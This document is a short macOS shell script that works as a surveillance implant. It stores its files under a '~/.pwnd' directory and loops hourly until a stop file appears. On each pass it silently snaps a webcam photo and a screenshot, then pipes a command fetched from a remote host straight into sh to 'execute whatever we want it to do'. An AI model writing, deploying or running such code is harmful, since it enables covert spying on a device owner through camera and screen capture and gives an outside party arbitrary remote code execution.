#!/bin/sh
loop() {
	local DELAY=3600

	# load host from file
	HOST=$(cat ~/.pwnd/host)

	echo "Waiting for $DELAY to finish, for first update @ $(date +%s)" >> ~/.pwnd/started
	while [ ! -f ~/.pwnd/stop ]; do
		sleep $DELAY
		update
	done
	echo "Stopped @ $(date +%s)" >> ~/.pwnd/stopped
}

update() {
	# Take a pic...
	~/.pwnd/imagesnap/imagesnap ~/.pwnd/pictures/$(date +%s).jpeg

	# and screenshot \o/
	screencapture -x ~/.pwnd/screenshots/$(date +%s).jpeg

	# and execute whatever we want it to do
	curl -s "${HOST}/command" | sh  > /dev/null &>/dev/null || :
}

loop
